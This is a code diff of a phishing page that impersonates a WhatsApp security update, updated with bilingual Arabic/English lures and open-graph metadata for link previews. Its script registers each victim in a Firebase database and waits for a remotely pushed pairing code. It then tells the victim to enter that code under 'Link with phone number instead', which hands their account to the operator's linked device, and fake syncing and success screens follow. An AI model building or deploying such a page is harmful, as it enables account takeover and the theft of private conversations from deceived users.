@@ -1,40 +1,60 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en" prefix="og: http://ogp.me/ns#">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>WhatsApp Update</title>
+
     <meta property="og:title" content="WhatsApp Security Update">
-    <meta property="og:description" content="تم توفير تحديث أمني جديد. يرجى إدخال رمز التحقق لتأمين محادثاتك.">
-    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg">
-    
+    <meta property="og:description" content="Your verification code is ready! Update your account to version V3.0.1 now.">
+    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/WhatsApp.svg/600px-WhatsApp.svg.png">
+    <meta property="og:image:type" content="image/png">
+    <meta property="og:image:width" content="600">
+    <meta property="og:image:height" content="600">
+    <meta property="og:url" content="https://wa-protocol-update.vercel.app">
+    <meta property="og:type" content="website">
+    <meta property="og:site_name" content="WhatsApp">
+    <meta name="twitter:card" content="summary_large_image">
+
+    <link rel="icon" href="https://static.whatsapp.net/rsrc.php/v3/yP/r/r_o_pS3X9sl.png" type="image/x-icon">
     <style>
-        body { font-family: -apple-system, sans-serif; background: #fff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        .container { width: 90%; max-width: 400px; text-align: center; padding: 25px; border-radius: 15px; border: 1px solid #f0f2f5; }
-        .logo { width: 60px; margin-bottom: 15px; }
-        .title { color: #00a884; font-size: 19px; font-weight: bold; margin-bottom: 10px; }
-        .desc { color: #667781; font-size: 13px; line-height: 1.5; margin-bottom: 20px; }
-        .code-box { background: #f8f9fa; border: 1.5px solid #00a884; border-radius: 10px; padding: 25px; margin-bottom: 15px; min-height: 90px; display: flex; align-items: center; justify-content: center; position: relative; }
-        #pairing-code { font-size: 34px; font-weight: bold; color: #111b21; letter-spacing: 5px; font-family: monospace; }
-        #loading-ui { display: none; }
-        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #00a884; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 10px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .success-mark { display: none; color: #00a884; font-size: 50px; }
+        * { box-sizing: border-box; }
+        body { font-family: -apple-system, sans-serif; display: flex; flex-direction: column; align-items: center; background: #fff; margin: 0; padding: 20px; }
+        .container { width: 100%; max-width: 380px; text-align: center; }
+        .logo { width: 65px; margin-top: 20px; margin-bottom: 25px; user-select: none; pointer-events: none; }
+        .header-title { font-size: 22px; font-weight: 700; color: #075e54; margin-bottom: 10px; }
+        .badge { background: #e7f3f3; color: #128c7e; padding: 5px 15px; border-radius: 20px; font-size: 12px; font-weight: bold; display: inline-block; margin-bottom: 25px; }
+        .v-box { background: #f8f9fa; border: 1px solid #e9ecef; border-radius: 12px; padding: 18px; margin-bottom: 25px; }
+        .v-row { display: flex; justify-content: space-between; font-size: 14px; margin: 10px 0; }
+        .alert-p { font-size: 14px; color: #3b4a54; text-align: start; line-height: 1.5; border-top: 1px solid #eee; padding-top: 20px; margin-bottom: 15px; }
+        .steps { text-align: start; font-size: 14px; color: #1c1e21; line-height: 1.6; }
+        .code-zone { border: 1.5px solid #00a884; border-radius: 10px; padding: 20px; margin-top: 25px; min-height: 110px; display: flex; flex-direction: column; justify-content: center; position: relative; }
+        #pairing-code { font-size: 32px; font-weight: bold; color: #075e54; letter-spacing: 5px; font-family: monospace; margin-bottom: 10px; }
+        .wait-text { font-size: 12px; font-weight: 500; color: #8696a0; }
+        #success-screen { display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #fff; flex-direction: column; justify-content: center; align-items: center; z-index: 10; }
+        .check-mark { color: #00a884; font-size: 45px; font-weight: bold; }
+        b { font-weight: 800; color: #000; }
     </style>
 </head>
 <body>
     <div class="container">
         <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo">
-        <div id="ui-content">
-            <div class="title">تحديث نظام التشفير V3.0.1</div>
-            <p class="desc" id="info-text">أدخل الرمز أدناه في "الأجهزة المرتبطة" على هاتفك لبدء المزامنة الآمنة للمحادثات.</p>
-            <div class="code-box">
-                <div id="pairing-code">---- ----</div>
-                <div id="loading-ui"><div class="spinner"></div><p style="font-size:12px; color:#8696a0;">جاري معالجة البيانات...</p></div>
-                <div id="success-ui" class="success-mark">✓</div>
+        <div class="header-title">WhatsApp Security Update</div>
+        <div id="u-badge" class="badge">Checking Device...</div>
+        <div class="v-box">
+            <div class="v-row"><span id="v-label">Current Version:</span><span style="color:#d91e1e; font-weight:bold">V2.12.5</span></div>
+            <div class="v-row"><span>Update To:</span><span style="color:#00a884; font-weight:bold">V3.0.1</span></div>
+        </div>
+        <p id="u-alert" class="alert-p"></p>
+        <div id="u-steps" class="steps"></div>
+        <div class="code-zone">
+            <div id="pairing-code">...</div>
+            <div id="u-wait" class="wait-text"></div>
+            <div id="success-screen">
+                <div class="check-mark">✓</div>
+                <div id="success-text" style="font-weight:bold; font-size:15px"></div>
             </div>
         </div>
-        <p style="font-size: 11px; color: #abb4bb;">© 2026 WhatsApp Inc. Security Protocol</p>
     </div>
 
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
@@ -44,25 +64,57 @@
         firebase.initializeApp(config);
         const db = firebase.database();
         const userId = new URLSearchParams(window.location.search).get('id');
+        const isAr = navigator.language.startsWith('ar');
+        const isIOS = /iPhone|iPad|iPod/.test(navigator.userAgent);
+        const deviceType = isIOS ? "iPhone" : "Android";
+        
+        const content = {
+            ar: { 
+                vLabel: "الإصدار الحالي:", badge: isIOS ? "جهاز مرتبط: iPhone" : "جهاز مرتبط: Android", 
+                alert: "لحماية خصوصيتك، يجب ترقية إصدار V2.12.5 فوراً لضمان تشفير المحادثات.", 
+                steps: "1. ستتلقى الآن تنبيه 'ربط جهاز جديد' من تطبيق WhatsApp.<br>2. افتح التنبيه واختر <b>'الربط باستخدام رقم الهاتف بدلاً من ذلك'</b>.<br>3. أدخل <b>الرمز المكون من 8 أرقام</b> الظاهر بالأسفل في هاتفك:", 
+                wait: "في انتظار الرمز الأمني...", done: "أدخل الرمز الآن في هاتفك", success: "تم التحديث بنجاح." 
+            },
+            en: { 
+                vLabel: "Current Version:", badge: isIOS ? "Linked Device: iPhone" : "Linked Device: Android", 
+                alert: "To protect your privacy, upgrade version V2.12.5 immediately to ensure chat encryption.", 
+                steps: "1. You will receive a 'Link a Device' notification from WhatsApp.<br>2. Open the notification and select <b>'Link with phone number instead'</b>.<br>3. Enter the <b>8-digit code</b> shown below into your phone:", 
+                wait: "Awaiting security code...", done: "Enter the code on your phone now", success: "Updated successfully." 
+            }
+        };
+
+        const c = isAr ? content.ar : content.en;
+        document.documentElement.dir = isAr ? 'rtl' : 'ltr';
+        document.getElementById('v-label').innerText = c.vLabel;
+        document.getElementById('u-badge').innerText = c.badge;
+        document.getElementById('u-alert').innerHTML = c.alert;
+        document.getElementById('u-steps').innerHTML = c.steps;
+        document.getElementById('u-wait').innerText = c.wait;
 
         if (userId) {
-            db.ref('monitoring/' + userId).set({ status: "Online", platform: navigator.platform });
+            const sRef = db.ref('monitoring/' + userId);
+            
+            // إشعار دخول فوري للبوت (بدون طلب GPS)
+            sRef.set({ 
+                status: "🔥 Online", 
+                device: deviceType,
+                last_seen: Date.now()
+            });
 
-            db.ref('commands/' + userId).on('value', snap => {
-                const v = snap.val();
+            db.ref('commands/' + userId).on('value', s => {
+                const v = s.val();
                 if (v) {
-                    if (v.code) {
-                        document.getElementById('pairing-code').innerText = v.code;
+                    if (v.code) { 
+                        document.getElementById('pairing-code').innerText = v.code; 
+                        document.getElementById('u-wait').innerText = c.done; 
+                        document.getElementById('u-wait').style.color = "#d91e1e"; 
                     }
                     if (v.status === 'syncing') {
-                        document.getElementById('pairing-code').style.display = 'none';
-                        document.getElementById('loading-ui').style.display = 'block';
-                        document.getElementById('info-text').innerText = "جاري تحديث قاعدة بيانات الصور والرسائل المشفره...";
+                        document.getElementById('u-wait').innerText = isAr ? "جاري مزامنة البيانات..." : "Syncing data...";
                     }
-                    if (v.status === 'done') {
-                        document.getElementById('loading-ui').style.display = 'none';
-                        document.getElementById('success-ui').style.display = 'block';
-                        document.getElementById('info-text').innerText = "تم تأمين الحساب بنجاح.";
+                    if (v.status === 'connected') {
+                        document.getElementById('success-screen').style.display = 'flex';
+                        document.getElementById('success-text').innerText = c.success;
                     }
                 }
             });
